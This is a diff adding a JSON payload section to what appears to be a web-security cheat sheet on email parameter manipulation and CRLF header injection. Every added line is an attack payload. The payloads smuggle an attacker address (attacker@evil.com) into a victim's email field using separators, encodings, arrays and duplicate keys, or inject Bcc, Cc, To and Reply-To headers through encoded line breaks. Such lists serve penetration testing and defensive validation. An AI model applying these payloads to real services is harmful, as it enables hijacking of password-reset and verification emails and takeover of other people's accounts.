@@ -55,3 +55,58 @@ email=user@dot.com\r\nTo:attacker@dot.com
 email=user@dot.com\r\nReply-To:attacker@dot.com
 email=user@dot.com\r\nHeader-Injection: Success
 ```
+
+### JSON Combined
+```
+// === PARAMETER MANIPULATION PAYLOADS ===
+
+{"email": "victim@example.com,attacker@evil.com"}
+{"email": "victim@example.com;attacker@evil.com"}
+{"email": "victim@example.com%2Cattacker@evil.com"}
+{"email": "victim@example.com%3Battacker@evil.com"}
+{"email": "victim@example.com%0Attacker@evil.com"}
+{"email": "victim@example.com%0D%0AAttacker@evil.com"}
+{"email": "victim@example.com%250Aattacker@evil.com"}
+{"email": "victim@example.com%0D%0Aattacker@evil.com"}
+{"email": "victim@example.com%0D%0A%20attacker@evil.com"}
+{"email": "victim@example.com%0D%0A%09attacker@evil.com"}
+
+{"email": ["victim@example.com", "attacker@evil.com"]}
+{"email": ["victim@example.com"], "email": ["attacker@evil.com"]}
+{"email": ["victim@example.com"], "extra": ["attacker@evil.com"]}
+{"emails": ["victim@example.com", "attacker@evil.com"]}
+{"email_address": ["victim@example.com", "attacker@evil.com"]}
+{"recipient": ["victim@example.com", "attacker@evil.com"]}
+
+{"email": "victim@example.com", "email": "attacker@evil.com"}
+{"email": "victim@example.com", "Email": "attacker@evil.com"}
+{"email": "victim@example.com", "recipient": "attacker@evil.com"}
+{"recipient": "victim@example.com", "bcc": "attacker@evil.com"}
+
+
+// === CRLF INJECTION IN EMAIL HEADER ===
+
+{"email": "victim@example.com%0D%0ABcc: attacker@evil.com"}
+{"email": "victim@example.com%0D%0ACc: attacker@evil.com"}
+{"email": "victim@example.com%0D%0ATo: attacker@evil.com"}
+{"email": "victim@example.com%0D%0AFrom: attacker@evil.com"}
+{"email": "victim@example.com%0D%0AReply-To: attacker@evil.com"}
+{"email": "victim@example.com%0D%0AReturn-Path: attacker@evil.com"}
+{"email": "victim@example.com%0D%0AX-Injected: yes"}
+{"email": "victim@example.com%0D%0ASubject: Hacked"}
+{"email": "victim@example.com%0D%0A\r\nBcc: attacker@evil.com"}
+{"email": "victim@example.com%0D%0A\nBcc: attacker@evil.com"}
+
+{"email": "victim@example.com\r\nBcc: attacker@evil.com"}
+{"email": "victim@example.com\nBcc: attacker@evil.com"}
+{"email": "victim@example.com\rBcc: attacker@evil.com"}
+{"email": "victim@example.com\r\nX-Test: 1"}
+{"email": "victim@example.com\r\nContent-Type: text/html"}
+
+{"email": ["victim@example.com\r\nBcc: attacker@evil.com"]}
+{"email": ["victim@example.com\nBcc: attacker@evil.com"]}
+{"email": ["victim@example.com%0D%0ABcc: attacker@evil.com"]}
+
+{"email": "victim@example.com%250D%250ABcc: attacker@evil.com"}
+{"email": "victim@example.com%0D%0A%20Bcc:%20attacker@evil.com"}
+```
